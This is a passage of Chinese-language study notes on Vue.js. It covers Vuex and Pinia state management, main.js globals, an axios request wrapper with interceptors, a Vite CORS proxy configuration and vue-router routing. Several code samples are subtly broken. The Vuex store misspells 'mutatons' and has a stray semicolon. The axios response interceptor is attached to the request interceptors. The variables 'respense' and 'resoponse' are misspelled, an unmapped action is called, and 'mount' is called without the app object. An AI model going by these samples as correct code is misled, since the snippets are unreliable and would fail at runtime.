</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="3-Vuex"><a href="#3-Vuex" class="headerlink" title="3 Vuex"></a>3 Vuex</h3><blockquote><p>Vuex是一个专为<code>Vue.js</code>应用程序开发的<strong>状态管理模式＋库</strong>。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p><p>简单来说，状态管理可以理解成为了更方便的管理组件之间的数据交互，提供了一个集中式的管理方案，任何组件都可以按照指定的方式进行读取和改变数据。</p><p>最常用的核心概念包含：</p><ul><li>state：存储数据</li><li>Getter：对数据进行过滤</li><li>Mutation：修改数据</li><li>Action：类似Mutation，但是Action是提交Mutation，不是变更状态，并且Action可以包含任意异步操作</li></ul><p><a href="https://vuex.vuejs.org/zh/guide/">official::Vuex (vuejs.org)</a></p><p>安装：<code>npm i vuex</code></p><p>新建文件：<code>src/store/index.js</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">&quot;vuex&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Vuex的核心作用就是管理组件之间的状态</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store = <span class="title function_">createStore</span>(&#123;</span><br><span class="line">    <span class="comment">// 所有的状态都放在这里（数据）</span></span><br><span class="line">    <span class="attr">state</span>: &#123;</span><br><span class="line">        <span class="comment">// 定义数据</span></span><br><span class="line">        <span class="attr">counter</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 对数据进行过滤</span></span><br><span class="line">    <span class="attr">getters</span>: &#123;</span><br><span class="line">        <span class="title function_">getCount</span>(<span class="params">state</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> state.<span class="property">counter</span> &gt; <span class="number">0</span> ? state.<span class="property">counter</span> : <span class="string">&quot;counter小于0，不符合要求&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 修改数据</span></span><br><span class="line">    <span class="attr">mutatons</span>: &#123;</span><br><span class="line">        <span class="title function_">addCounter</span>(<span class="params">state, num</span>)&#123;</span><br><span class="line">            state.<span class="property">counter</span> += num;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 为异步操作做准备</span></span><br><span class="line">    <span class="attr">actions</span>: &#123;</span><br><span class="line">        <span class="title function_">asyncAddCounter</span>(<span class="params">&#123; commit &#125;</span>)&#123;</span><br><span class="line">          axios.<span class="title function_">get</span>(<span class="string">&quot;http://iwenwiki.com/api/generator/list.php&quot;</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&quot;addCounter&quot;</span>, res.<span class="property">data</span>[<span class="number">0</span>])</span><br><span class="line">        &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在main.js中引入store</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&quot;./store&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">use</span>(store).<span class="title function_">mount</span>(<span class="string">&quot;#app&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 直接在组件中进行使用 --&gt;</span><br><span class="line">&lt;!-- 读取方法1：用于单次 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p&gt;counter = &#123;&#123; $store.state.counter &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;counter = &#123;&#123; $store.state.getCount &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;button @click=&quot;addClickHandle&quot;&gt;增加&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;addAsyncClickHandle&quot;&gt;异步增加&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">        addClickHandle()&#123;</span><br><span class="line">            // 固定调用方式</span><br><span class="line">            this.$store.commit(&quot;addCounter&quot;, 10);</span><br><span class="line">        &#125;,</span><br><span class="line">        addAsyncClickHandle()&#123;</span><br><span class="line">            this.$store.dispatch(&quot;asyncAddCounter&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 读取方法2：用于多次 --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p&gt;counter = &#123;&#123; counter &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;counter = &#123;&#123; getCounter &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;button @click=&quot;addClickHandle&quot;&gt;增加&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; mapState, mapGetters, mapMutations &#125; from &quot;vuex&quot;</span><br><span class="line">export default&#123;</span><br><span class="line">    computed: &#123;</span><br><span class="line">        // 专门来读取vuex的数据</span><br><span class="line">        ...mapState([&quot;counter&quot;]),</span><br><span class="line">        ...mapGetters([&quot;getCounter&quot;])</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">        ...mapMutations([&quot;addCounter&quot;]),</span><br><span class="line">        addClickHandle()&#123;</span><br><span class="line">            this.addCounter(20);</span><br><span class="line">        &#125;,</span><br><span class="line">        addAsyncClickHandle()&#123;</span><br><span class="line">            this.asyncAddCounter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="4-Pinia"><a href="#4-Pinia" class="headerlink" title="4 Pinia"></a>4 Pinia</h3><blockquote><p>由于 Pinia 在生态系统中能够承担相同的职责且能做得更好，因此 Vuex 现在处于维护模式。对于新的应用，建议使用 Pinia。</p><p><a href="https://pinia.vuejs.org/zh/introduction.html">official::Pinia (vuejs.org)</a></p><p>安装：<code>npm i pinia</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js引入pinia</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&#x27;pinia&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">createPinia</span>())</span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="五、Vue网络"><a href="#五、Vue网络" class="headerlink" title="五、Vue网络"></a>五、Vue网络</h2><h3 id="1-Vue结构"><a href="#1-Vue结构" class="headerlink" title="1 Vue结构"></a>1 Vue结构</h3><blockquote><p>应用实例：每个Vue应用都是通过<code>createApp</code>函数创建一个新的应用实例。</p><p>根组件：我们传入<code>createApp</code>的对象实际上是一个组件，每个应用都需要一个”根组件”，其他组件将作为其子组件。</p><p>挂载应用：应用实例必须在调用了<code>.mount()</code>方法后才会渲染出来。该方法接收一个”容器”参数，可以是一个实际的DOM元素或是一个CSS选择器字符串。</p><p><code>src/assets</code>：存放css，图片等资源。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- <span class="title class_">App</span>.<span class="property">vue</span> --&gt;</span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="comment">// 挂载根组件，组件从App.vue开始</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// app：Vue实例对象</span></span><br><span class="line"><span class="comment">// 在一个Vue项目中，有且只有一个Vue的实例对象</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挂载应用</span></span><br><span class="line"><span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在index.html中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 挂载对应的位置是此处，之后所有的页面都将放在这个位置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- vue代码最后都会被编译成main.js，然后引入main.js执行代码 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/src/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-main-js"><a href="#2-main-js" class="headerlink" title="2 main.js"></a>2 main.js</h3><blockquote><p>vue代码最后都会被编译成main.js，然后引入main.js执行代码。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载app中间</span></span><br><span class="line"><span class="comment">// 定义全局变量（名字是$serverIP，$符号不是必须的）</span></span><br><span class="line">app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$serverIP</span> = <span class="string">&#x27;localhost:8000&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">// any.vue</span><br><span class="line">export default &#123;</span><br><span class="line">  created() &#123;</span><br><span class="line">    // 使用全局变量</span><br><span class="line">    console.log(this.$serverIP); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="3-axios"><a href="#3-axios" class="headerlink" title="3 axios"></a>3 axios</h3><blockquote><p>基于promise网络请求库，作用于node.js和浏览器中。</p><p>安装：<code>npm i axios</code></p><p>文档：<a href="https://www.axios-http.cn/docs/intro">official::Axios中文文档</a></p></blockquote><h3 id="4-路由配置"><a href="#4-路由配置" class="headerlink" title="4 路由配置"></a>4 路由配置</h3><blockquote><p>安装：</p><ul><li><code>npm i axios</code></li><li><code>npm i querystring</code></li></ul><p>路径创建：</p><ul><li><code>/src/api/index.js</code>：访问网页</li><li><p><code>/src/api/path.js</code>：网络路径</p></li><li><p><code>/src/utils/request.js</code>：网络请求处理</p></li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;../utils/request.js&quot;</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;./path.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> api = &#123;</span><br><span class="line"><span class="title function_">getIndex</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">return</span> axios.<span class="title function_">get</span>(path.<span class="property">baseUrl</span> + path.<span class="property">suffix</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出api</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> api;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// path.js</span></span><br><span class="line"><span class="comment">// 一条路径</span></span><br><span class="line"><span class="keyword">const</span> base = &#123;</span><br><span class="line"><span class="attr">baseUrl</span>: <span class="string">&quot;localhost:8000&quot;</span>,</span><br><span class="line"><span class="attr">suffix</span>: <span class="string">&quot;/iAmIn.html&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出base给别的js使用</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> base;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&quot;axios&quot;</span></span><br><span class="line"><span class="keyword">import</span> querystring <span class="keyword">from</span> <span class="string">&quot;querystring&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 超时设置</span></span><br><span class="line"><span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line"><span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用场景：拦截器</span></span><br><span class="line"><span class="comment">// 发送拦截</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line"><span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// post格式做额外处理</span></span><br><span class="line"><span class="keyword">if</span>(config.<span class="property">method</span> === <span class="string">&quot;post&quot;</span>)&#123;</span><br><span class="line">config.<span class="property">data</span> = querystring.<span class="title function_">stringify</span>(config.<span class="property">data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// config：包含网络请求的所有信息</span></span><br><span class="line"><span class="keyword">return</span> config;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(error);</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 详细错误显示</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">errorHandle</span> = (<span class="params">status,info</span>) =&gt;&#123;</span><br><span class="line"><span class="keyword">switch</span>(status)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">400</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;语义有误&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">401</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务器认证失败&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">403</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务器拒绝访问&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">404</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;地址错误&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">500</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务器遇到意外&quot;</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">502</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;服务器无响应&quot;</span>);<span class="keyword">break</span> ;</span><br><span class="line"><span class="attr">default</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(info);<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取拦截</span></span><br><span class="line">instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(</span><br><span class="line"><span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">return</span> response.<span class="property">status</span> === <span class="number">200</span> ? <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(respense) : <span class="title class_">Promise</span>.<span class="title function_">reject</span>(response);</span><br><span class="line">&#125;,</span><br><span class="line"><span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">// 解构赋值</span></span><br><span class="line"><span class="keyword">const</span> &#123; response &#125; = error;</span><br><span class="line"><span class="comment">// 主要关注错误处理</span></span><br><span class="line"><span class="title function_">errorHandle</span>(resoponse.<span class="property">status</span>, response.<span class="property">info</span>);</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> instance;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 使用api --&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import api from &quot;../api/index.js&quot;</span><br><span class="line">export default&#123;</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        api.getIndex().then(res =&gt;&#123;</span><br><span class="line">        console.log(res.data);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="5-跨域问题"><a href="#5-跨域问题" class="headerlink" title="5 跨域问题"></a>5 跨域问题</h3><blockquote><p>JS采取的是同源策略。</p><p>同源策略是浏览器的一项安全策略，浏览器只允许js代码请求和当前所在服务器域名，端口，协议相同的数据接口上的数据,这就是同源策略。</p><p>也就是说，当<strong>协议、域名、端口</strong>任意一个不相同时，都会产生跨域问题，所以又应该如何解决跨域问题呢。</p><p>跨域常见异常：</p><ul><li><code>Access to XMLHttpRequest at &quot;url&quot; from origin &quot;url&quot; has been blocked by CORS policy： No &#39;Access-Control-Allow-Origin’ header is present on the requested resource.</code></li><li><code>GET</code><url><code>net : :ERR_FAILED 200</code></url></li><li><code>Uncaught (in promise)</code></li></ul><p>后台跨域：cors</p><p>前台跨域：proxy</p><p><strong>解决完跨域配置之后，要重启服务器才有用。</strong></p><p>注：配置代理的时候<code>&#39;/api&#39;</code>如果直接写成<code>&#39;/&#39;</code>，这样表示<code>http://127.0.0.1:80/</code>后面的路由都进行代理，这样会导致你加载本地资源会出错，因为你把加载本地资源的路径全部都代理到服务端去了，浏览器会向服务器进行资源请求，这样就会导致页面报错。</p><p><strong>切记</strong>：本地同时前后端联合调试的时候，目标请求地址不能用 localhost，必须改成 127.0.0.1，否则会报错：<code>http proxy error: Error: connect ECONNREFUSED ::1:8000</code>。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在vite.config.js的defineConfig后面添加下列代码，修改url即可</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">    <span class="attr">plugins</span>: [<span class="title function_">vue</span>()],</span><br><span class="line">    <span class="comment">// 在 vite.config.js 后面添加下列代码，修改url即可</span></span><br><span class="line"><span class="attr">server</span>: &#123;</span><br><span class="line">        <span class="attr">https</span>: <span class="literal">true</span>, <span class="comment">// 开启https</span></span><br><span class="line"><span class="attr">proxy</span>: &#123;</span><br><span class="line">            <span class="comment">// 配置需要代理的路径，http://&lt;url&gt;/api/后的所有路由都会被代理</span></span><br><span class="line">          <span class="comment">// &#x27;/api&#x27;指的是以该名字开头的路径都会替换成下列url，可以路由配置的基网址可以写成&#x27;/api&#x27;</span></span><br><span class="line"><span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line"><span class="attr">target</span>: <span class="string">&#x27;&lt;url&gt;&#x27;</span>,  <span class="comment">// 服务器地址（协议，域名，端口（默认80））</span></span><br><span class="line"><span class="attr">changeOrigin</span>: <span class="literal">true</span>, <span class="comment">// 允许跨域</span></span><br><span class="line">                <span class="attr">ws</span>: <span class="literal">true</span>,  <span class="comment">// 允许websocket代理</span></span><br><span class="line"><span class="attr">rewrite</span>: <span class="function">(<span class="params">path</span>) =&gt;</span> path.<span class="title function_">replace</span>(<span class="regexp">/^\/api/</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">// 重写路径，将api替换成空</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="6-页面跳转"><a href="#6-页面跳转" class="headerlink" title="6 页面跳转"></a>6 页面跳转</h3><blockquote><p>在Vue中，我们可以通过<code>vue-router</code>路由管理页面之间的关系。</p><p>Vue Router是Vue.js的官方路由。它与Vue.js核心深度集成，让用Vue.js构建单页应用变得轻而易举。</p><p>安装：<code>npm i vue-router</code></p><p>路径创建：</p><ul><li><code>/src/router/index.js</code>：路由配置文件</li><li><code>/src/views/name.vue</code>：路由对应的文件</li></ul><p>histroy的参数：</p><ul><li><code>createwebHashHistory()</code>：显示出的网址如下：home：<code>http://localhost : 8080/#/</code>，about：<code>http://localhost:8080/# / about</code>。原理是a标签锚点连接。</li><li><code>createwebHistory()</code>：显示出的网址如下：home：<code>http://localhost:8080</code>，about：<code>http://localhost:8080/ about</code>。此种方式，需要后台配合做重定向，否则会出现404问题。原理是H5的pushState()</li></ul><p>createWebHashHistory使用URL的哈希部分（如example.com/#/path）作为路径，这种模式下，浏览器不会发送实际的请求，而是通过监听URL的变化来实现前端路由的跳转。这种模式的优点是兼容性好，甚至可以在不支持HTML5历史模式的浏览器中正常使用，但URL中的哈希部分可能不太美观。</p><p>createWebHistory使用真实的URL路径（如example.com/path），需要服务器的支持，通过HTML5的history API来实现前端路由的跳转。这种模式的优点是URL更加美观，没有哈希部分，但兼容性可能稍差，需要服务器的配置支持。</p><p>需要注意的是，createWebHistory只有在服务器配置正确的情况下才能正常工作，而createWebHashHistory则不需要服务器配置。因此，在选择使用哪种创建函数时，需要考虑项目的需求以及服务器的配置情况。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createRouter, createWebHashHistory &#125; <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"><span class="comment">// 引入组件（一般只引入首页，其他写出函数引入）</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">HomeView</span> <span class="keyword">from</span> <span class="string">&#x27;../views/index.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 路由路径</span></span><br><span class="line"><span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">        <span class="comment">// 为路由命名</span></span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;home&#x27;</span>,</span><br><span class="line">        <span class="comment">// 对应组件</span></span><br><span class="line"><span class="attr">component</span>: <span class="title class_">HomeView</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">        <span class="comment">// 直接绑定</span></span><br><span class="line"><span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/about.vue&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createRouter</span>(&#123;</span><br><span class="line"><span class="attr">history</span>: <span class="title function_">createWebHashHistory</span>(),</span><br><span class="line">routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- App.vue --&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;!-- 设置路由跳转 --&gt;</span><br><span class="line">&lt;router-link to=&quot;/&quot;&gt;首页&lt;/router-link&gt;</span><br><span class="line">&lt;router-link to=&quot;/about&quot;&gt;关于&lt;/router-link&gt;</span><br><span class="line">&lt;!-- 显示路由 --&gt;</span><br><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 引入文件夹，使用use安装路由</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">use</span>(router).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="7-路由带参"><a href="#7-路由带参" class="headerlink" title="7 路由带参"></a>7 路由带参</h3><blockquote><p>在路由中携带参数。常见业务是页面中存在列表项，然后点击每个列表项查看详情。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由index.js</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// :name表示参数，如果想带多个参数只需要继续斜杆冒号即可</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;/list/:name[/:other...]&quot;</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;list&quot;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/ListView.vue&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- vue中带参 --&gt;</span><br><span class="line">&lt;li&gt;&lt;router-link to=&quot;/list/内蒙&quot;&gt;内蒙旅游十大景区&lt;/router-link&gt;&lt;/1i&gt;</span><br><span class="line">&lt;li&gt;&lt;router-link to=&quot;/list/北京&quot;&gt;北京旅游十大景区&lt;/router-link&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;router-link to=&quot;/list/四川&quot;&gt;四川旅游十大景区&lt;/router-link&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 详细界面中使用参数 --&gt;</span><br><span class="line">&lt;p&gt; &#123;&#123; $route.params.name&#125;&#125; 城市旅游景区详情&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="8-路由嵌套"><a href="#8-路由嵌套" class="headerlink" title="8 路由嵌套"></a>8 路由嵌套</h3><blockquote><p>页面中继续有页面选项。</p></blockquote><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 路由index.js</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&#x27;/about&#x27;</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;about&#x27;</span>,</span><br><span class="line">        <span class="comment">// 重定向，功能是用来显示默认第一个页面</span></span><br><span class="line">        <span class="attr">redirect</span>: <span class="string">&quot;/about/us&quot;</span>,</span><br><span class="line">        <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/AboutView.vue&quot;</span>),</span><br><span class="line">        <span class="attr">children</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 二级导航不要加斜杠</span></span><br><span class="line">                <span class="attr">path</span>: <span class="string">&quot;us&quot;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/AboutSub/AboutUS.vue&quot;</span>)</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&quot;info&quot;</span>,</span><br><span class="line">                <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&quot;../views/AboutSub/AboutInfo.vu e&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- vue中使用 --&gt;</span><br><span 